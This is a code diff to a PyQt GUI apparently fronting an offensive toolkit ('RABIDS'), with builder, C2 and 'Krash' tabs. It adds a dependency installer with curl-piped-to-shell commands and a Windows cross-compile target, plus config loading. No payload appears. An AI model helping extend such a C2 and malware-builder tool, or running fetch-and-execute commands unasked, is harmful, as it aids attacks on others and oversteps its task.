@@ -1,6 +1,7 @@
 import sys
 import os
 import subprocess
+import shutil
 from pathlib import Path
 from PyQt5.QtWidgets import QApplication, QMainWindow, QTabWidget
 from PyQt5.QtGui import QFont
@@ -305,15 +306,19 @@ class RABIDSGUI(QMainWindow):
         self.tabs = QTabWidget()
         self.setCentralWidget(self.tabs)
         
+        # Load configuration early so we can provide module options to builder
+        config = self.read_config()
+        module_options = config.get('module_options', {})
+
         # Create all tab widgets
-        self.builder_widget = BuilderWidget(self.base_dir)
+        self.builder_widget = BuilderWidget(self.base_dir, module_options)
         self.output_widget = OutputWidget(self.base_dir)
-        self.c2_widget = C2Widget()
-        self.krash_widget = KrashWidget()
+        self.c2_widget = C2Widget(self.base_dir)
+        self.krash_widget = KrashWidget(self.base_dir)
         self.garbage_widget = GarbageCollectorWidget(self.base_dir)
-        self.whispers_widget = SilentWhispersWidget()
+        self.whispers_widget = SilentWhispersWidget(self.base_dir)
         self.docs_widget = DocsWidget(self.base_dir)
-        self.settings_widget = SettingsWidget()
+        self.settings_widget = SettingsWidget(self.base_dir)
         
         # Add tabs
         self.tabs.addTab(self.builder_widget, "BUILDER")
@@ -347,19 +352,96 @@ class RABIDSGUI(QMainWindow):
         # Garbage Collector signals
         self.garbage_widget.restore_requested.connect(self.handle_restore)
         
-        # Settings signals
-        self.settings_widget.install_nim_requested.connect(
-            lambda: self.install_dependency("nim", "curl https://nim-lang.org/choosenim/init.sh -sSf | sh")
+        # Settings signals (connect to package-manager-aware installer)
+        self.settings_widget.install_nim_tool_requested.connect(
+            lambda: self._install_from_widget("nim")
         )
-        self.settings_widget.install_nasm_requested.connect(
-            lambda: self.install_dependency("nasm", "brew install nasm" if sys.platform == "darwin" else "sudo apt install nasm")
+        self.settings_widget.install_rust_tool_requested.connect(
+            lambda: self._install_from_widget("rust")
         )
         self.settings_widget.install_python_requested.connect(
-            lambda: self.install_dependency("python", "brew install python" if sys.platform == "darwin" else "sudo apt install python3")
+            lambda: self._install_from_widget("python")
         )
-        self.settings_widget.install_node_requested.connect(
-            lambda: self.install_dependency("node", "brew install node" if sys.platform == "darwin" else "sudo apt install nodejs")
+        self.settings_widget.install_nimble_requested.connect(
+            lambda: self._install_from_widget("nimble")
         )
+        self.settings_widget.install_rust_targets_requested.connect(
+            lambda: self._install_from_widget("rust_targets")
+        )
+        self.settings_widget.install_docker_requested.connect(
+            lambda: self._install_from_widget("docker")
+        )
+
+    def _install_from_widget(self, tool):
+        cmd = self.get_install_cmd(tool)
+        if not cmd:
+            self.output_widget.log_message(f"[-] No suitable package manager found for installing '{tool}'. Please install manually.")
+            return
+        self.install_dependency(tool, cmd)
+
+    def get_install_cmd(self, tool):
+        """Return an appropriate install command for `tool` based on detected package manager."""
+        # Detect package manager
+        pm = None
+        if shutil.which("brew"):
+            pm = "brew"
+        elif shutil.which("apt-get") or shutil.which("apt"):
+            pm = "apt"
+        elif shutil.which("pacman"):
+            pm = "pacman"
+        elif shutil.which("choco"):
+            pm = "choco"
+        elif shutil.which("winget"):
+            pm = "winget"
+
+        # Map tool -> command per package manager
+        if tool == "nim":
+            if pm == "brew":
+                return "curl https://nim-lang.org/choosenim/init.sh -sSf | sh"
+            if pm == "apt":
+                return "sudo apt-get update && sudo apt-get install -y nim"
+            if pm == "pacman":
+                return "sudo pacman -S --noconfirm nim"
+            if pm == "choco":
+                return "choco install nim -y"
+            if pm == "winget":
+                return "winget install -e --id NimLang.Nim"
+            return "curl https://nim-lang.org/choosenim/init.sh -sSf | sh"
+
+        if tool == "rust":
+            cmd = "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y"
+            return cmd
+
+        if tool == "python":
+            if pm == "brew":
+                return "brew install python"
+            if pm == "apt":
+                return "sudo apt-get update && sudo apt-get install -y python3 python3-pip"
+            if pm == "pacman":
+                return "sudo pacman -S --noconfirm python python-pip"
+            if pm == "choco":
+                return "choco install python -y"
+            if pm == "winget":
+                return "winget install Python.Python.3"
+            return "python3 -m pip install --upgrade pip"
+
+        if tool == "nimble":
+            return "nimble install -y"
+
+        if tool == "rust_targets":
+            # Add a common Windows target as example
+            return "rustup target add x86_64-pc-windows-gnu"
+
+        if tool == "docker":
+            if pm == "brew":
+                return "brew install --cask docker"
+            if pm == "apt":
+                return "sudo apt-get update && sudo apt-get install -y docker.io"
+            if pm == "pacman":
+                return "sudo pacman -S --noconfirm docker"
+            if pm == "choco":
+                return "choco install docker-desktop -y"
+            return None
     
     def handle_build(self, modules, options):
         """Handle build request from builder widget."""
@@ -435,11 +517,30 @@ class RABIDSGUI(QMainWindow):
         config_path = self.base_dir / "rabids_config.json"
         if config_path.exists():
             try:
-                with open(config_path, 'r') as f:
+                with open(config_path, 'r', encoding='utf-8') as f:
                     config = __import__('json').load(f)
-                    # Apply settings to widgets as needed
+                # Apply settings to widgets as needed
+                try:
+                    self.builder_widget.load_settings(config)
+                except Exception:
+                    pass
+                try:
+                    self.settings_widget.load_settings(config)
+                except Exception:
+                    pass
             except Exception:
                 pass
+
+    def read_config(self):
+        """Return parsed configuration dict or empty dict."""
+        config_path = self.base_dir / "rabids_config.json"
+        if config_path.exists():
+            try:
+                with open(config_path, 'r', encoding='utf-8') as f:
+                    return __import__('json').load(f)
+            except Exception:
+                return {}
+        return {}
     
     def save_settings(self):
         """Save settings to config file."""
